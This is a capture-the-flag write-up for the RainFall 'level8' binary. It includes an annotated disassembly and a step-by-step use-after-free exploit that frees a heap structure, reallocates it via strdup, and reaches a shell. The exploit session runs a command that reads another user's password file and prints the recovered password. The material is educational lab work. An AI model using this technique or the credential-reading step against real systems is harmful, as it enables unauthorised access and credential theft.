# level8

1. [Analysis](#analysis)
2. [Exploit](#exploit)

> Please note that due to a programming error, we can easily resolve this level without using the expected vulnerability, but we will act as if the binary worked as intended. The bug makes the program to allocate the space of an address instead of a structure.

## Analysis

We have an big `main` function:

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     push   edi
   0x08048568 <+4>:     push   esi
   0x08048569 <+5>:     and    esp,0xfffffff0
   0x0804856c <+8>:     sub    esp,0xa0
   0x08048572 <+14>:    jmp    0x8048575 <main+17>
   0x08048574 <+16>:    nop
   0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0               ; ecx = data variable 'service' address
   0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac               ; edx = data variable 'auth' address
   0x08048581 <+29>:    mov    eax,0x8048810                            ; eax = text section address ("%p, %p \n")
   0x08048586 <+34>:    mov    DWORD PTR [esp+0x8],ecx                  ; load 3rd printf arg from ecx
   0x0804858a <+38>:    mov    DWORD PTR [esp+0x4],edx                  ; load 2nd printf arg from edx
   0x0804858e <+42>:    mov    DWORD PTR [esp],eax                      ; load 1st printf arg from eax
   0x08048591 <+45>:    call   0x8048410 <printf@plt>                   ; printf("%p, %p \n", auth address, service address)
   0x08048596 <+50>:    mov    eax,ds:0x8049a80                         ; eax = stdin
   0x0804859b <+55>:    mov    DWORD PTR [esp+0x8],eax                  ; load fgets 3rd arg from eax
   0x0804859f <+59>:    mov    DWORD PTR [esp+0x4],0x80                 ; load fgets 2nd arg (128)
   0x080485a7 <+67>:    lea    eax,[esp+0x20]                           ; eax = variable on stack (buffer)
   0x080485ab <+71>:    mov    DWORD PTR [esp],eax                      ; load fgets 1st arg from eax
   0x080485ae <+74>:    call   0x8048440 <fgets@plt>                    ; fgets(buffer, 128, stdin)
   0x080485b3 <+79>:    test   eax,eax                                  ; check fgets return value
   0x080485b5 <+81>:    je     0x804872c <main+456>                     ; if zero jump to the end of the function
   0x080485bb <+87>:    lea    eax,[esp+0x20]                           ; eax = buffer
   0x080485bf <+91>:    mov    edx,eax                                  ; edx = eax
   0x080485c1 <+93>:    mov    eax,0x8048819                            ; eax = 'auth' address
   0x080485c6 <+98>:    mov    ecx,0x5                                  ; ecx = 5
   0x080485cb <+103>:   mov    esi,edx                                  ; esi = edx (buffer)
   0x080485cd <+105>:   mov    edi,eax                                  ; edi = eax ('auth')
   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   ; while edi - esi = 0 && ecx > 0
   0x080485d1 <+109>:   seta   dl                                       ; set dl byte to 1 if above 
   0x080485d4 <+112>:   setb   al                                       ; set al byte to 1 if below
   0x080485d7 <+115>:   mov    ecx,edx
   0x080485d9 <+117>:   sub    cl,al
   0x080485db <+119>:   mov    eax,ecx
   0x080485dd <+121>:   movsx  eax,al                                   ;
   0x080485e0 <+124>:   test   eax,eax                                  ; check if eax == 0
   0x080485e2 <+126>:   jne    0x8048642 <main+222>                     ; jump if not
   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4                      ; load malloc arg (4)
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>                   ; malloc(4)
   0x080485f0 <+140>:   mov    ds:0x8049aac,eax                         ; 'auth' = malloc return value
   0x080485f5 <+145>:   mov    eax,ds:0x8049aac                         ; eax = 'auth' allocated address
   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0                      ; eax 4 bytes content = 0
   0x08048600 <+156>:   lea    eax,[esp+0x20]                           ; eax = buffer address
   0x08048604 <+160>:   add    eax,0x5                                  ; eax = buffer[5]
   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff          ; 
   0x0804860f <+171>:   mov    edx,eax
   0x08048611 <+173>:   mov    eax,0x0
   0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:   mov    edi,edx
   0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>:   mov    eax,ecx
   0x08048620 <+188>:   not    eax
   0x08048622 <+190>:   sub    eax,0x1
   0x08048625 <+193>:   cmp    eax,0x1e
   0x08048628 <+196>:   ja     0x8048642 <main+222>
   0x0804862a <+198>:   lea    eax,[esp+0x20]
   0x0804862e <+202>:   lea    edx,[eax+0x5]
   0x08048631 <+205>:   mov    eax,ds:0x8049aac
   0x08048636 <+210>:   mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>:   mov    DWORD PTR [esp],eax
   0x0804863d <+217>:   call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:   lea    eax,[esp+0x20]
   0x08048646 <+226>:   mov    edx,eax
   0x08048648 <+228>:   mov    eax,0x804881f
   0x0804864d <+233>:   mov    ecx,0x5
   0x08048652 <+238>:   mov    esi,edx
   0x08048654 <+240>:   mov    edi,eax
   0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:   seta   dl
   0x0804865b <+247>:   setb   al
   0x0804865e <+250>:   mov    ecx,edx
   0x08048660 <+252>:   sub    cl,al
   0x08048662 <+254>:   mov    eax,ecx
   0x08048664 <+256>:   movsx  eax,al
   0x08048667 <+259>:   test   eax,eax
   0x08048669 <+261>:   jne    0x8048678 <main+276>
   0x0804866b <+263>:   mov    eax,ds:0x8049aac
   0x08048670 <+268>:   mov    DWORD PTR [esp],eax
   0x08048673 <+271>:   call   0x8048420 <free@plt>
   0x08048678 <+276>:   lea    eax,[esp+0x20]
   0x0804867c <+280>:   mov    edx,eax
   0x0804867e <+282>:   mov    eax,0x8048825
   0x08048683 <+287>:   mov    ecx,0x6
   0x08048688 <+292>:   mov    esi,edx
   0x0804868a <+294>:   mov    edi,eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:   seta   dl
   0x08048691 <+301>:   setb   al
   0x08048694 <+304>:   mov    ecx,edx
   0x08048696 <+306>:   sub    cl,al
   0x08048698 <+308>:   mov    eax,ecx
   0x0804869a <+310>:   movsx  eax,al
   0x0804869d <+313>:   test   eax,eax
   0x0804869f <+315>:   jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    eax,[esp+0x20]
   0x080486a5 <+321>:   add    eax,0x7
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:   mov    ds:0x8049ab0,eax
   0x080486b5 <+337>:   lea    eax,[esp+0x20]
   0x080486b9 <+341>:   mov    edx,eax
   0x080486bb <+343>:   mov    eax,0x804882d
   0x080486c0 <+348>:   mov    ecx,0x5
   0x080486c5 <+353>:   mov    esi,edx
   0x080486c7 <+355>:   mov    edi,eax
   0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:   seta   dl
   0x080486ce <+362>:   setb   al
   0x080486d1 <+365>:   mov    ecx,edx
   0x080486d3 <+367>:   sub    cl,al
   0x080486d5 <+369>:   mov    eax,ecx
   0x080486d7 <+371>:   movsx  eax,al
   0x080486da <+374>:   test   eax,eax
   0x080486dc <+376>:   jne    0x8048574 <main+16>
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
   0x080486fa <+406>:   jmp    0x8048574 <main+16>
   0x080486ff <+411>:   mov    eax,ds:0x8049aa0
   0x08048704 <+416>:   mov    edx,eax
   0x08048706 <+418>:   mov    eax,0x804883b
   0x0804870b <+423>:   mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:   mov    DWORD PTR [esp],eax
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:   jmp    0x8048574 <main+16>
   0x0804872c <+456>:   nop
   0x0804872d <+457>:   mov    eax,0x0
   0x08048732 <+462>:   lea    esp,[ebp-0x8]
   0x08048735 <+465>:   pop    esi
   0x08048736 <+466>:   pop    edi
   0x08048737 <+467>:   pop    ebp
   0x08048738 <+468>:   ret
End of assembler dump.
```

After analysing how this executable works and rewriting the source code, we understand that we need to set the variable 'auth' of the structure 'auth' to a value other than 0 in order to execute the `system` call.

The whole code of `main` is wrapped inside an infinite loop (such as `while (1)`), which prints two variable adresses, wait for a user input, then performs differents actions if the input begins by one theses commands : `auth `, `reset`, `service` or `login`. The input is read from stdin with `fgets`, avoiding a buffer overflow here.

We notice two memory allocations, a `malloc` call for the 'auth' structure and a `strdup` of the 'service' variable. In the first one, `strcpy` is used to fill in the array of char of the 'auth' structure, but a `strlen` check prevents us again from exploiting a buffer overflow.

Taking a closer look to the allocated pointers, we see that the `reset` command will free the structure 'auth', but dont set its pointer to 'NULL', keeping this address readable without any segfault . Indeed, we know that `free` will just set the memory block as 'free for use', according to the `malloc` implementation. After some researches , we find the kind of exploit we can use here, a 'use-after-free'.

## Exploit

The main goal of this exploit is to write on the memory space of the structure 'auth' to change the value of its variable 'auth' which is checked to allow the execution of `system`. Let's run the program and begin by allocating space to the 'auth' structure.

```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth hackerman     # ^_^
0x804a008, (nil)
```

The structure 'auth' is now allocated at the address `0x804a008`. We will try to free it with `reset`, then write on the same space using the `service` command that will call `strdup` to allocate space on the heap and copy the string we provide to it. We expect `malloc` to return the same address as previously (`0x804a008`) because we will `free` the block before.

In order to overwrite the value of 'auth->auth', we need to send a string which is at least 33 bytes long : the 32 first bytes will overwrite the array of characters 'auth->name' and the 33rd the 'auth->auth' variable. Please note that the characters we send don't matter, all we need is a final value different from 0x00000000 at the address `0x804a008 + 32`.

Last detail, we should not send more than 36 characters, otherwise the targeted memory block won't be large enough and `malloc` will allocate us some space from a different heap address. Why 36 ? Because this is the size of the 'auth' structure previously allocated. Now let's do this !

```console
reset
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a008    # the real output is different due to the bug mentioned at the top of this document
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
